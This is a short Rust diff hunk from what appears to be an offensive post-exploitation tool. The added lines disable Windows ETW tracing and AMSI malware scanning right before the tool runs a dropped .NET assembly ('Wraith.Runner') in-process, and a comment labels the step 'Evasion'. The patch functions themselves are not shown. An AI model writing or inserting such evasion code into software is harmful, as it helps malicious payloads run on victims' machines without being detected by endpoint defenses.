@@ -32,6 +32,10 @@ impl PowerShell {
 
             match unsafe { self.drop_runner(runner_path) } {
                 Ok(_) => {
+                    // Evasion: Patch ETW and AMSI before execution
+                    let _ = unsafe { crate::modules::patch::patch_etw() };
+                    let _ = unsafe { crate::modules::patch::patch_amsi() };
+
                     let res = ClrHost::execute_assembly(
                         runner_path,
                         "Wraith.Runner",
